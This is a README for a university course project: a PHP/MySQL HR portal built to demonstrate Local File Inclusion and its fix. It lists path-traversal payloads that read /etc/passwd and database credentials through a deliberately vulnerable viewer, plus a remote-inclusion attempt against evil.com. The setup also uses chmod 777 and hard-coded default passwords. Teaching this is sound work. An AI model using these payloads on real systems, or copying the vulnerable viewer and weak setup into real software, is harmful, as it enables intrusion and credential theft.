# NovaCorp HR Portal — CYS 538 Project

> A corporate HR Management System built with PHP, MySQL, HTML, and JavaScript.
> Demonstrates LFI (Local File Inclusion) vulnerability and its countermeasures.

---

## Table of Contents
1. [Project Overview](#project-overview)
2. [Tech Stack](#tech-stack)
3. [Project Structure](#project-structure)
4. [Setup Instructions](#setup-instructions)
5. [Database Setup](#database-setup)
6. [Default Credentials](#default-credentials)
7. [LFI Attack Demo](#lfi-attack-demo)
8. [Security Features](#security-features)

---

## Project Overview

NovaCorp HR Portal is a web-based Human Resources management system that supports two user roles:

- **Applicant** — Register, browse jobs, apply with CV upload, track application status
- **Admin** — Review applications, view CVs, manage job listings, update statuses

The project demonstrates a real-world LFI (Local File Inclusion) vulnerability in the CV file viewer, followed by practical countermeasures to block the attack.

---

## Tech Stack

| Component | Technology |
|-----------|------------|
| Operating System | Ubuntu 22.04 LTS |
| Web Server | Apache2 |
| Database | MySQL 8.x |
| Backend | PHP 8.x |
| Frontend | HTML, CSS, JavaScript |
| Icons | Tabler Icons (CDN) |

---

## Project Structure

```
hr_portal/
├── db.php                  # Database connection (PDO)
├── header.php              # Shared layout, sidebar, styles
├── index.php               # Home page
├── login.php               # Login with session management
├── register.php            # Applicant registration
├── jobs.php                # Job listings from database
├── apply.php               # Apply for job + CV upload
├── my_applications.php     # Applicant application tracker
├── admin.php               # Admin panel (admin only)
├── add_job.php             # Post new job (admin only)
├── view.php                # VULNERABLE file viewer (LFI demo)
├── view_secure.php         # SECURE file viewer (countermeasures)
├── logout.php              # Session destroy + redirect
├── uploads/                # CV file storage
└── logs/                   # Security event logs
    └── security.log
```

---

## Setup Instructions

### Step 1 — Install LAMP Stack on Ubuntu

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install apache2 -y
sudo apt install mysql-server -y
sudo apt install php libapache2-mod-php php-mysql -y
```

### Step 2 — Verify Apache is Running

Open your browser and go to:
```
http://localhost
```
You should see the Apache2 Ubuntu Default Page.

### Step 3 — Copy Project Files

```bash
sudo cp -r hr_portal/ /var/www/html/
sudo chmod 777 /var/www/html/hr_portal/uploads
sudo chmod 777 /var/www/html/hr_portal/logs
```

### Step 4 — Restart Apache

```bash
sudo systemctl restart apache2
sudo systemctl restart mysql
```

---

## Database Setup

### Step 1 — Login to MySQL

```bash
sudo mysql
```

### Step 2 — Create Database User

```sql
CREATE USER 'hruser'@'localhost' IDENTIFIED BY 'Hr@123456';
FLUSH PRIVILEGES;
```

### Step 3 — Create Database and Tables

```sql
CREATE DATABASE hr_portal;
GRANT ALL PRIVILEGES ON hr_portal.* TO 'hruser'@'localhost';
FLUSH PRIVILEGES;
USE hr_portal;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    email VARCHAR(100) NOT NULL,
    password VARCHAR(255) NOT NULL,
    role ENUM('admin','employee','applicant') DEFAULT 'applicant',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE jobs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(100) NOT NULL,
    description TEXT,
    department VARCHAR(50),
    posted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE applications (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    job_id INT,
    cv_filename VARCHAR(255),
    status ENUM('pending','reviewed','accepted','rejected') DEFAULT 'pending',
    applied_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id),
    FOREIGN KEY (job_id) REFERENCES jobs(id)
);
```

### Step 4 — Insert Admin User

```sql
INSERT INTO users (username, email, password, role) VALUES
('admin', 'admin@novacorp.com', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'admin');
```

### Step 5 — Insert Sample Jobs

```sql
INSERT INTO jobs (title, description, department) VALUES
('Cybersecurity Analyst', 'Responsible for monitoring and protecting company networks and systems from cyber threats. Must have experience with SIEM tools, penetration testing, and incident response.', 'IT Security'),
('HR Business Partner', 'Partner with business leaders to develop and implement HR strategies. Handle employee relations, talent acquisition, and performance management.', 'Human Resources'),
('DevOps Engineer', 'Design and implement CI/CD pipelines, manage cloud infrastructure, and ensure system reliability. Experience with Docker, Kubernetes, and AWS required.', 'Engineering'),
('Data Analyst', 'Analyze business data to provide actionable insights. Build dashboards and reports using Power BI or Tableau. Strong SQL and Excel skills required.', 'Business Intelligence'),
('Software Engineer', 'Develop and maintain web applications using modern frameworks. Experience with PHP, Python or JavaScript required.', 'Engineering');

exit;
```

### Step 6 — Verify Database Connection

```bash
php /var/www/html/hr_portal/db.php
```

If nothing appears = connection is working 

---

## Default Credentials

### Website Login
| Role | Username | Password |
|------|----------|----------|
| Admin | admin | password |
| Applicant | Register a new account | — |

### Database Connection (db.php)
| Field | Value |
|-------|-------|
| Host | localhost |
| Database | hr_portal |
| Username | hruser |
| Password | Hr@123456 |

---

## LFI Attack Demo

### Vulnerable Page — Attack Succeeds 

```
http://localhost/hr_portal/view.php?file=../../../../etc/passwd
```
Result: Exposes Linux system users file

```
http://localhost/hr_portal/view.php?file=../db.php
```
Result: Exposes database credentials

### Secure Page — Attack Blocked 

```
http://localhost/hr_portal/view_secure.php?file=../../../../etc/passwd
```
Result: Access Denied — LFI Attack Blocked!

```
http://localhost/hr_portal/view_secure.php?file=../db.php
```
Result: Access Denied — LFI Attack Blocked!

### RFI Attack — Failed (Server Configuration) 

```
http://localhost/hr_portal/view.php?file=http://evil.com/malware.php
```
Result: Failed — allow_url_include=Off by default in PHP

Verify with:
```bash
php -i | grep allow_url_include
# Output: allow_url_include => Off => Off
```

---

## Security Features

| Feature | Implementation |
|---------|---------------|
| Password Hashing | `password_hash()` with BCRYPT |
| Prepared Statements | PDO with `?` placeholders on all SQL queries |
| Session Management | `$_SESSION` for login state |
| Role-Based Access | Admin-only pages check `$_SESSION['role']` |
| Client-Side Validation | HTML5 attributes + JavaScript |
| Server-Side Validation | PHP `preg_match()`, `filter_var()` |
| LFI Countermeasure | Whitelist validation + realpath verification |
| Security Logging | Attack attempts logged to `logs/security.log` |
| Output Sanitization | `htmlspecialchars()` on all output |

---

## Course Information

- **Course:** CYS 538 — Web Technology and Security
- **University:** Imam Abdulrahman Bin Faisal University
- **Vulnerability Chosen:** RFI/LFI
- **Submission Date:** May 30, 2026

---
